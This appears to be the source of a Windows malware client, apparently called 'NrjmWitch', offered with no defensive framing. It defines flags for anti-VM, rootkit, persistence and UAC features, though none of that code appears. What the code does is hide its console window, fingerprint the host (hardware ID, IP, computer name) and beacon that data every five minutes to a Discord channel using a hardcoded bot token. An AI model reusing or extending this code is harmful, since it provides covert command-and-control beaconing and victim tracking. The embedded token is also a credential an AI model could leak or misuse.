#define USE_ANTIVM
#define USE_STARTUP
#define USE_CRYPT
#define USE_HOOK
#define USE_SOCKET
#define USE_ROOTKIT
#define USE_PERSISTENCE
#define USE_UAC
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <ws2tcpip.h>
#include <string>
#include <thread>
#include <chrono>
#include <sstream>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "ws2_32.lib")

const std::string LICENSE_KEY = "bd498abafe6490b3cad8641db0ed0fa1";
const std::string BOT_TOKEN = "MTQ3MTU0MDY0NDA3MjkxOTE4Mg.G09i_c.Fn8VXUaIC9_a-Lqs2hxl11orZt-NsBdttd0VhA";
const std::string CHANNEL_ID = "1471566542302089226";

std::string GetComputerName() {
    char buffer[256];
    DWORD size = sizeof(buffer);
    if (GetComputerNameA(buffer, &size)) return std::string(buffer);
    return "Unknown";
}

std::string GetHardwareID() {
    char volumeName[MAX_PATH + 1] = { 0 };
    DWORD serialNumber = 0;
    if (GetVolumeInformationA("C:\\", volumeName, sizeof(volumeName), &serialNumber, NULL, NULL, NULL, 0)) {
        std::stringstream ss;
        ss << std::hex << serialNumber;
        return ss.str();
    }
    return "Unknown";
}

std::string GetLocalIP() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return "127.0.0.1";
    
    char hostname[256];
    if (gethostname(hostname, sizeof(hostname)) == 0) {
        struct hostent* host = gethostbyname(hostname);
        if (host) {
            struct in_addr addr;
            addr.s_addr = *(u_long*)host->h_addr_list[0];
            std::string ip = inet_ntoa(addr);
            WSACleanup();
            return ip;
        }
    }
    WSACleanup();
    return "127.0.0.1";
}

std::string GetOSVersion() {
    return "Windows";
}

bool SendCheckin() {
    std::string hwid = GetHardwareID();
    std::string ip = GetLocalIP();
    std::string pcName = GetComputerName();
    std::string os = GetOSVersion();
    
    std::string message = "!checkin " + LICENSE_KEY + " " + hwid + " " + ip + " " + pcName + " " + os;
    std::string jsonPayload = "{\"content\":\"" + message + "\"}";
    
    HINTERNET hSession = InternetOpenA("NrjmWitch/1.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hSession) return false;

    HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return false;
    }

    std::string path = "/api/v10/channels/" + CHANNEL_ID + "/messages";
    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    
    if (hRequest) {
        std::string headers = "Authorization: Bot " + BOT_TOKEN + "\r\nContent-Type: application/json";
        HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)jsonPayload.c_str(), (DWORD)jsonPayload.length());
        InternetCloseHandle(hRequest);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    return true;
}

int main() {
    #ifndef _DEBUG
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif
    
    SendCheckin();
    
    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(5));
        SendCheckin();
    }
    
    return 0;
}